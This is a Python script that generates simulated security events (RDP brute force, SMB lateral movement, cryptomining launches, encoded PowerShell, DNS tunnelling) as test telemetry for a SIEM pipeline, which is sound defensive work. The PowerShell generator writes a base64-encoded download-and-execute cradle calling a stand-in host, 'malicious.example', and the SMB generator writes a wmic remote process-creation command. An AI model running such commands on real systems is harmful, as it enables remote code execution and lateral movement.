#!/usr/bin/env python3
"""Generate simulated security events for the SIEM pipeline.

The script can emit burst traffic for specific scenarios or run continuously
with mixed telemetry written to Kafka and to JSONL files for Logstash's file
input. The JSON payloads intentionally resemble CloudTrail, Windows Event Logs,
Sysmon, PowerShell Operational logs, and DNS resolver logs.
"""

from __future__ import annotations

import argparse
import json
import random
import string
import sys
import time
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Callable, Dict, Iterable

try:
    from kafka import KafkaProducer  # type: ignore
except Exception:  # pragma: no cover - kafka-python optional
    KafkaProducer = None  # type: ignore

DATA_DIR = Path(__file__).resolve().parents[2] / "data" / "incoming"
DATA_DIR.mkdir(parents=True, exist_ok=True)

SCENARIOS = ("crypto", "rdp", "smb", "powershell", "dns")


def utcnow() -> datetime:
    return datetime.now(timezone.utc)


@dataclass
class Event:
    log_type: str
    message: Dict[str, object]

    def as_json(self) -> str:
        return json.dumps({
            "@timestamp": utcnow().isoformat(),
            "log_type": self.log_type,
            "message": self.message,
        })


def _random_instance_name() -> str:
    return f"ip-{random.randint(10, 99)}-{random.randint(10, 99)}-miner"


def _random_ip() -> str:
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def crypto_mining_events(count: int) -> Iterable[Event]:
    for _ in range(count):
        event = {
            "eventVersion": "1.0",
            "eventSource": "ec2.amazonaws.com",
            "eventName": "RunInstances",
            "user": {
                "type": "IAMUser",
                "userName": random.choice(["devops", "automation", "unknown"]),
            },
            "responseElements": {
                "instancesSet": {
                    "items": [
                        {
                            "instanceId": f"i-{random.randint(1000, 9999)}",
                            "tagSet": {
                                "items": [
                                    {"key": "Name", "value": _random_instance_name()},
                                    {"key": "Purpose", "value": "compute"},
                                ]
                            },
                        }
                    ]
                }
            },
            "sourceIPAddress": _random_ip(),
        }
        yield Event("cloudtrail", event)


def rdp_bruteforce_events(count: int) -> Iterable[Event]:
    attacker_ip = _random_ip()
    target = random.choice(["SRV-FILE01", "SRV-DC02", "SRV-TERM01"])
    for _ in range(count):
        event = {
            "EventCode": 4625,
            "EventID": 4625,
            "Keywords": "0x8010000000000000",
            "LogonType": 10,
            "Account_Name": random.choice(["administrator", "svc_backup", "jane.doe"]),
            "Source_Network_Address": attacker_ip,
            "Workstation_Name": target,
        }
        yield Event("windows", event)

    # Optional success
    success = random.choice([True, False])
    if success:
        yield Event(
            "windows",
            {
                "EventCode": 4624,
                "Account_Name": "administrator",
                "Source_Network_Address": attacker_ip,
                "Workstation_Name": target,
            },
        )


def smb_lateral_events(count: int) -> Iterable[Event]:
    attacker = random.choice(["SRV-TERM01", "WS-ENG12"])
    targets = random.sample(["SRV-DB01", "SRV-DB02", "SRV-APP01", "SRV-APP02", "SRV-FILE01"], k=3)
    for target in targets:
        for _ in range(count):
            event = {
                "System": {"Computer": attacker},
                "EventData": {
                    "Image": "C\\\\Windows\\\\System32\\\\wmic.exe",
                    "DestinationIp": _random_ip(),
                    "DestinationPort": 445,
                    "User": random.choice(["corp\\\\svc_deploy", "corp\\\\administrator"]),
                    "CommandLine": "wmic /node:{} process call create powershell.exe".format(target),
                },
            }
            yield Event("sysmon", event)


def powershell_events(count: int) -> Iterable[Event]:
    import base64

    encoded_payload = "IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/payload.ps1')"
    encoded = base64.b64encode(encoded_payload.encode("utf-16le")).decode()
    for _ in range(count):
        event = {
            "ComputerName": random.choice(["WS-ENG12", "WS-FIN02"]),
            "UserId": random.choice(["corp\\jdoe", "corp\\svc_deploy"]),
            "CommandLine": f"powershell.exe -encodedCommand {encoded}",
        }
        yield Event("powershell", event)


def dns_tunnel_events(count: int) -> Iterable[Event]:
    alphabet = string.ascii_lowercase + string.digits
    for _ in range(count):
        subdomain = "".join(random.choice(alphabet) for _ in range(40))
        event = {
            "timestamp": utcnow().isoformat(),
            "client_ip": _random_ip(),
            "query": f"{subdomain}.corp.example.com",
            "query_type": "A",
            "response_size": random.randint(150, 500),
        }
        yield Event("dns", event)


SCENARIO_GENERATORS: Dict[str, Callable[[int], Iterable[Event]]] = {
    "crypto": crypto_mining_events,
    "rdp": rdp_bruteforce_events,
    "smb": smb_lateral_events,
    "powershell": powershell_events,
    "dns": dns_tunnel_events,
}


def write_file(events: Iterable[Event], scenario: str) -> Path:
    ts = utcnow().strftime("%Y%m%dT%H%M%S")
    path = DATA_DIR / f"{ts}-{scenario}.json"
    with path.open("w", encoding="utf-8") as fh:
        for event in events:
            fh.write(event.as_json())
            fh.write("\n")
    return path


def send_kafka(events: Iterable[Event], scenario: str, producer: KafkaProducer | None) -> None:
    if producer is None:
        return
    for event in events:
        producer.send("telemetry-bus", value=json.loads(event.as_json()))
    producer.flush()


def run_burst(scenario: str, size: int, producer: KafkaProducer | None) -> None:
    generator = SCENARIO_GENERATORS[scenario]
    events = list(generator(size))
    path = write_file(events, scenario)
    print(f"[+] Wrote {len(events)} {scenario} events to {path}")
    send_kafka(events, scenario, producer)
    if producer:
        print(f"[+] Published {len(events)} {scenario} events to Kafka topic telemetry-bus")


def run_continuous(duration: int, producer: KafkaProducer | None) -> None:
    end_time = time.time() + duration
    print(f"[*] Streaming mixed events for {duration} seconds")
    while time.time() < end_time:
        scenario = random.choice(SCENARIOS)
        size = random.randint(5, 20)
        run_burst(scenario, size, producer)
        time.sleep(random.randint(5, 15))


def main() -> None:
    parser = argparse.ArgumentParser(description="Generate simulated security events")
    parser.add_argument("--burst", action="append", choices=SCENARIOS, help="Emit a burst of events for the scenario")
    parser.add_argument("--size", type=int, default=30, help="Events per burst (default: 30)")
    parser.add_argument("--continuous", type=int, help="Stream mixed events for N seconds")
    parser.add_argument("--kafka", default="kafka:9092", help="Kafka bootstrap servers")
    args = parser.parse_args()

    producer = None
    if KafkaProducer is not None:
        try:
            producer = KafkaProducer(bootstrap_servers=args.kafka, value_serializer=lambda v: json.dumps(v).encode("utf-8"))
        except Exception as exc:  # pragma: no cover - Kafka optional
            print(f"[!] Failed to connect to Kafka: {exc}")
            producer = None
    else:
        print("[!] kafka-python library not installed. Kafka publishing disabled.")

    if args.burst:
        for scenario in args.burst:
            run_burst(scenario, args.size, producer)

    if args.continuous:
        run_continuous(args.continuous, producer)

    if not args.burst and not args.continuous:
        parser.print_help()


if __name__ == "__main__":
    main()
